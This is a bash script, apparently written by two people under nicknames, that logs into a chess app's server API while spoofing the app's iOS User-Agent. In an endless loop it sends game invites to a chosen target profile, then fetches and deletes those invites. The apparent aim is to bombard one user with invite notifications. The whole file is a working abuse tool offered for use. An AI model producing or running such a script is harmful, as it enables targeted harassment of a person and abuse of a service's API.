#!/bin/bash
# by taup1n and slobber
# usage: $0 <login id> <password> <target profile id>

set -ex

if [ $# -lt 3 ]; then
  echo "$0 <login id> <password> <target profile id>"
  exit 1
fi

source vars.sh
source login.sh ${1} ${2}

_TARGET_UID=${3}

while true; do
  curl -H 'Accept: */*' -H 'User-Agent: haptic_chess/7.8.8.2 CFNetwork/894 Darwin/17.4.0' -H 'Accept-Language: en-us' --data "{
    \"username\" : \"${_TARGET_UID}\",
    \"secPerMove\" : 172800
  }" --compressed http://${_SERV_HOST}/juser/invite/user?tkn=${_TOKEN}

  gid=$(curl  -H 'Accept: */*' -H 'User-Agent: haptic_chess/7.8.8.2 CFNetwork/894 Darwin/17.4.0' -H 'Accept-Language: en-us' --compressed http://${_SERV_HOST}/jgame/active?tkn=${_TOKEN} | jq .result.myInvites[].id)

  for i in $gid; do
    curl -H 'Accept: */*' -H 'User-Agent: haptic_chess/7.8.8.2 CFNetwork/894 Darwin/17.4.0' -H 'Accept-Language: en-us' --data "{ }" --compressed "http://${_SERV_HOST}/juser/invite/delete/$i?tkn=${_TOKEN}"
  done
done
